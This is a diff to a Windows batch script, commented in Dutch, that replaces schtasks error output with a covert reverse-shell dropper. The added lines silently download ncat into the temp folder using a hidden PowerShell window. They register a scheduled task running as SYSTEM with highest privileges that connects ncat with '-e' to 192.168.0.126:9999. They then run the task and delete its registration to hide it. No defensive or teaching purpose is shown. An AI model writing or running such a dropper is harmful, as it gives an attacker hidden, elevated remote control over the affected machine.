@@ -1,9 +1,16 @@
-ERROR: Invalid Schedule Type specified.
-Type "SCHTASKS /CREATE /?" for usage.
-ERROR: Het systeem kan het opgegeven bestand niet vinden.
-ERROR: Het systeem kan het opgegeven bestand niet vinden.
-ERROR: Invalid Schedule Type specified.
-Type "SCHTASKS /CREATE /?" for usage.
-ERROR: Het systeem kan het opgegeven bestand niet vinden.
-ERROR: Het systeem kan het opgegeven bestand niet vinden.
-Press any key to continue . . .
+@echo off
+
+:: 1. Download de ZIP, pak hem uit en verwijder het zip-bestand (Volledig onzichtbaar)
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com' -OutFile '$env:TEMP\ncat.zip'; Expand-Archive -Path '$env:TEMP\ncat.zip' -DestinationPath '$env:TEMP\ncat' -Force; Remove-Item '$env:TEMP\ncat.zip'"
+
+:: 2. Maak de admin-taak aan (Nu correct geconfigureerd met /sc once en een dummy datum)
+schtasks /create /tn "SilentNcatTask" /tr "powershell.exe -WindowStyle Hidden -Command \"Start-Process -FilePath '$env:TEMP\ncat\ncat.exe' -ArgumentList '192.168.0.126 9999 -e $env:TEMP\ncat\commands.bat' -NoNewWindow\"" /sc once /sd 01/01/2000 /st 00:00 /rl highest /ru "SYSTEM" /f
+
+:: 3. Start de taak direct (ncat verbindt nu onzichtbaar met ADMIN-rechten)
+schtasks /run /tn "SilentNcatTask"
+
+:: 4. Wacht 3 seconden om ncat de tijd te geven om te verbinden, en wis daarna de taakregistratie netjes op
+timeout /t 3 /nobreak >nul
+schtasks /delete /tn "SilentNcatTask" /f
+
+exit
